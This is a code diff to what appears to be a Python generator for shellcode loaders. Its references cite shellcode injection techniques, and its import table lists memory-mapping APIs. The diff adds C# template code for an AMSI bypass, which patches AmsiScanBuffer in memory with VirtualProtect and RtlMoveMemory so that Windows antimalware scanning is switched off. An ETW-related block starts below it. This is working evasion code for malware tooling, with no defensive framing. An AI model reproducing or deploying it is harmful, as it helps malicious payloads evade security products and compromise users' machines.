@@ -4,6 +4,7 @@ import subprocess
 # References:
 # https://github.com/plackyhacker/Shellcode-Injection-Techniques
 # https://github.com/Kara-4search/EarlyBirdInjection_CSharp
+# https://github.com/0xB455/AmsiBypass/blob/master/Class1.cs
 
 DLL_IMPORT = {
   "VirtualAlloc": "",
@@ -13,6 +14,32 @@ DLL_IMPORT = {
   "NtMapViewOfSection":"",
 
 }
+
+AMSI_BYPASS_IMPORT = """
+  // [DllImport("kernel32")]
+  // public static extern IntPtr LoadLibrary(string name);
+  // [DllImport("kernel32")]
+  // public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+  // [DllImport("kernel32")]
+  // public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+  [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+  static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+"""
+
+AMSI_BYPASS_CODE = """
+IntPtr TargetDLL = LoadLibrary("amsi.dll");
+IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
+UIntPtr dwSize = (UIntPtr)4;
+uint Zero = 0;
+VirtualProtect(AmsiScanBufrPtr, dwSize, 0x40, out Zero);
+Byte[] Patch = { 0x31, 0xff, 0x90 }; //The new patch opcode
+IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+
+//Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
+MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3); 
+"""
+
 ETW_FUNCS = """
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
